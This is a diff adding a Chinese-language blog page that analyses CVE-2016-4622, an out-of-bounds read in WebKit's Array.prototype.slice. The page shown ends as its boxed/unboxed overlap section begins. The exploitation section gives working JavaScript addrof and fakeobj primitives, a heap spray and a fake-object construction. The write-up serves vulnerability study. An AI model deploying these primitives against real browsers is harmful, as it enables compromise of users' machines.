@@ -1,0 +1,1965 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="骑麦兜看落日">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="骑麦兜看落日">
+    
+    <meta name="keywords" content="骑麦兜看落日,骑麦兜看落日">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>[Vuln]CVE-2016-4622 WebKit Array slice OOB access · 骑麦兜看落日&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}')
+
+            var algolia = {
+                applicationID: '5D5KDIMZEQ',
+                apiKey: 'b4ec67c101aa9269e65e640e2e469343',
+                indexName: 'my_index',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >骑麦兜看落日</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">[Vuln]CVE-2016-4622 WebKit Array slice OOB access</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>骑麦兜看落日</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:30vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            [Vuln]CVE-2016-4622 WebKit Array slice OOB access
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Browser">Browser</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "WebKit">WebKit</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "OOB">OOB</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.2k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/04/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="CVE-2016-4622"><a href="#CVE-2016-4622" class="headerlink" title="CVE-2016-4622"></a>CVE-2016-4622</h1><p>[toc]</p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
+<p>Array的<code>slice()</code>方法在获取<code>end</code>时调用<code>valueOf</code>方法导致了数组越界访问</p>
+</blockquote>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><table>
+<thead>
+<tr>
+<th></th>
+<th>使用的环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>Mac OS X</td>
+<td>10.15.3</td>
+</tr>
+<tr>
+<td>调试器</td>
+<td>lldb</td>
+<td>lldb-1001.0.13.3 Swift-5.0</td>
+</tr>
+<tr>
+<td>反汇编器</td>
+<td>IDA Pro</td>
+<td>版本号: 7.0</td>
+</tr>
+<tr>
+<td>目标</td>
+<td>WebKit JavaScriptCore</td>
+<td>commit:3af5ce129e6636350a887d01237a65c2fce77823</td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>xcode</td>
+<td>Xcode_10.3</td>
+</tr>
+</tbody></table>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>由于漏洞太老了,所以现有的编译环境有问题,可以在现有webkit上打上patch,patch文件<a href="https://github.com/m1ghtym0/write-ups/blob/master/browser/CVE-2016-4622/vuln.patch" target="_blank" rel="noopener">write-ups/browser/CVE-2016-4622/vuln.patch</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cp vuln.patch &lt;WebKit-dir&gt;</span><br><span class="line">$ <span class="built_in">cd</span> &lt;WebKit-dir&gt;</span><br><span class="line">$ git checkout 3af5ce129e6636350a887d01237a65c2fce77823</span><br><span class="line">$ git apply vuln.patch</span><br><span class="line">$ Tools/Scripts/build-jsc --jsc-only --debug</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>这是一个数组越界访问(OOB)的漏洞,在<code>Array.prototype.slice</code>的实现中会出现一个Bug</p>
+<p>JavaScript中调用<code>slice()</code>方法时,将调用位于<code>Source/JavaScriptCore/runtime/ArrayPrototype.cpp</code>中的<code>arrayProtoFuncSlice()</code>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EncodedJSValue JSC_HOST_CALL <span class="title">arrayProtoFuncSlice</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* [[ 1 ]] */</span></span><br><span class="line">    JSObject* thisObj = exec-&gt;thisValue()</span><br><span class="line">    .toThis(exec, StrictMode)</span><br><span class="line">    .toObject(exec);</span><br><span class="line">    <span class="keyword">if</span> (!thisObj)</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(JSValue());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 2 ]] */</span></span><br><span class="line">    <span class="keyword">unsigned</span> length = getLength(exec, thisObj);</span><br><span class="line">    <span class="keyword">if</span> (exec-&gt;hadException())</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 3 ]] */</span></span><br><span class="line">    <span class="keyword">unsigned</span> begin = argumentClampedIndexFromStartOrEnd(exec, <span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">unsigned</span> end =</span><br><span class="line">    argumentClampedIndexFromStartOrEnd(exec, <span class="number">1</span>, length, length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 4 ]] */</span></span><br><span class="line">    <span class="built_in">std</span>::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult =</span><br><span class="line">    speciesConstructArray(exec, thisObj, end - begin);</span><br><span class="line">    <span class="comment">// We can only get an exception if we call some user function.</span></span><br><span class="line">    <span class="keyword">if</span> (UNLIKELY(speciesResult.first ==</span><br><span class="line">                 SpeciesConstructResult::Exception))</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 5 ]] */</span></span><br><span class="line">    <span class="keyword">if</span> (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp;</span><br><span class="line">               isJSArray(thisObj))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (JSArray* result =</span><br><span class="line">            asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))</span><br><span class="line">            <span class="keyword">return</span> JSValue::encode(result);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码本质上执行以下操作:</p>
+<ol>
+<li>获取this对象</li>
+<li>检查数组长度</li>
+<li>将参数(开始和结束的索引参数)转换为整数类型,并限制在[0, length)的长度范围</li>
+<li>检查是否使用了构造函数</li>
+<li>执行切片操作</li>
+</ol>
+<p>最后一步的实现可以用这两种方式完成:</p>
+<ol>
+<li>如果数组是具有密集存储的本地数组,则将使用<code>fastSlice</code>,使用给定的索引和长度将内存值写入新数组</li>
+<li>如果快速路径不可能,则使用简单循环来获取每个元素并将其添加到新数组</li>
+</ol>
+<h3 id="Javascript类型转换"><a href="#Javascript类型转换" class="headerlink" title="Javascript类型转换"></a>Javascript类型转换</h3><p>JavaScript是弱类型语言,所以它会根据需要将值转换为需要的类型</p>
+<p>如果对象有<code>valueOf</code>属性,则将会调用<code>valueOf</code>属性来获取值</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.abs(&#123;<span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">-42</span>; &#125;&#125;);</span><br><span class="line"><span class="comment">// 42</span></span><br></pre></td></tr></table></figure>
+
+<p>函数通过<code>argumentClampedIndexFromStartOrEnd</code>来限制索引在[0,lenght]的范围,其中通过<code>toInteger()</code>方法来转换为整数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JSValue value = exec-&gt;argument(argument);</span><br><span class="line"><span class="keyword">if</span> (value.isUndefined())</span><br><span class="line"><span class="keyword">return</span> undefinedValue;</span><br><span class="line">double indexDouble = value.toInteger(exec);  <span class="comment">// Conversion happens here</span></span><br><span class="line"><span class="keyword">if</span> (indexDouble &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    indexDouble += length;</span><br><span class="line">    <span class="keyword">return</span> indexDouble &lt; <span class="number">0</span> ? <span class="number">0</span> : static_cast&lt;unsigned&gt;(indexDouble);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> indexDouble &gt; length ? length :</span><br><span class="line">    static_cast&lt;unsigned&gt;(indexDouble);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> indexDouble &lt; <span class="number">0</span> ? <span class="number">0</span> : static_cast&lt;unsigned&gt;(indexDouble);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> indexDouble &gt; length ? length :static_cast&lt;unsigned&gt;(indexDouble);</span><br></pre></td></tr></table></figure>
+
+<p>现在,如果在<code>valueOf()</code>函数中修改数组长度,那么<code>slice()</code>方法的执行将继续使用前面的<code>length</code>变量,导致在memcpy期间越界访问.</p>
+<p>如果缩减数组,则会触发调整元素存储大小,从<code>JSArray::setLength</code>可以看出<code>.length</code>转换器的实现过程:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unsigned lengthToClear = butterfly-&gt;publicLength() - newLength;</span><br><span class="line">unsigned costToAllocateNewButterfly = <span class="number">64</span>; <span class="comment">// a heuristic.</span></span><br><span class="line"><span class="keyword">if</span> (lengthToClear &gt; newLength &amp;&amp;</span><br><span class="line">    lengthToClear &gt; costToAllocateNewButterfly) &#123;</span><br><span class="line">    reallocateAndShrinkButterfly(exec-&gt;vm(), newLength);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有了这些,就可以利用<code>Array.prototype.slice</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;<span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line"><span class="comment">// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="addrof"><a href="#addrof" class="headerlink" title="addrof"></a>addrof</h3><p>我们需要泄露出地址,那么就应该是<code>double</code>类型,所以先创建一个<code>ArrayWithDouble</code>数组</p>
+<p>然后收缩对象的<code>.length</code>触发数组的<code>reallocateAndShrinkButterfly</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    a.push(i + <span class="number">0.23</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> hax = &#123;</span><br><span class="line">    valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      a.length = <span class="number">0</span>;</span><br><span class="line">      a = [obj];</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  b = a.slice(<span class="number">0</span>, hax);</span><br><span class="line">  <span class="keyword">var</span> addr = b[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">return</span> f2i(addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fakeobj"><a href="#fakeobj" class="headerlink" title="fakeobj"></a>fakeobj</h3><p>我们需要伪造一个对象,那么就应该是<code>object</code>类型,所以先创建一个<code>ArrayWithContigous</code>数组</p>
+<p>通用收缩对象的<code>.length</code>触发数组的<code>reallocateAndShrinkButterfly</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  addr = i2f(addr);</span><br><span class="line">  <span class="keyword">var</span> a = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    a.push(&#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> hax = &#123;</span><br><span class="line">    valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      a.length = <span class="number">0</span>;</span><br><span class="line">      a = [addr];</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> b = a.slice(<span class="number">0</span>, hax);</span><br><span class="line">  <span class="keyword">var</span> obj = b[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="StructureID"><a href="#StructureID" class="headerlink" title="StructureID"></a>StructureID</h3><p>由于此时还没有StructureID随机化的保护,所以此时StructureID还是顺序递增的状态,可以通过构造大量的对象来喷射一个正确的StructureID</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">spray = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span>; i++) &#123;</span><br><span class="line">  temp = [<span class="number">1.1</span>];</span><br><span class="line">  temp.value = <span class="number">2.2</span>;</span><br><span class="line">  temp[<span class="string">"p"</span> + i] = <span class="number">3.3</span>;</span><br><span class="line">  spray.push(temp);</span><br><span class="line">&#125;</span><br><span class="line">controllee = spray[<span class="number">0x200</span>];</span><br></pre></td></tr></table></figure>
+
+<h3 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h3><p>我们需要通过victim来伪造一个controller去控制controllee</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    victim +-----------+-----------+</span><br><span class="line">           |  jscell   | butterfly |</span><br><span class="line">controller +-----------+-----------+</span><br><span class="line">           |  jscell   | butterfly | ----&gt; +-----------+-----------+ &lt;- controllee</span><br><span class="line">           +-----------+-----------+       |  jscell   | butterfly |</span><br><span class="line">                                           +-----------+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>实际构造如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag_ArrayWithDouble = <span class="number">0x01082107</span>;</span><br><span class="line">flag_ArrayWithCongious = <span class="number">0x01082109</span>;</span><br><span class="line">structure_id = <span class="number">0x200</span>;</span><br><span class="line">u32[<span class="number">0</span>] = structure_id;</span><br><span class="line">u32[<span class="number">1</span>] = flag_ArrayWithDouble;</span><br><span class="line">header_ArrayWithDouble = f64[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">victim = &#123;</span><br><span class="line">  fakeheader: header_ArrayWithDouble,</span><br><span class="line">  controllee_obj: controllee,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="overlap-boxed与unboxed"><a href="#overlap-boxed与unboxed" class="headerlink" title="overlap boxed与unboxed"></a>overlap boxed与unboxed</h3><p>重新构造<code>addrof</code>和<code>fakeobj</code>来更方便读取和应对有些情况下无法读的情况</p>
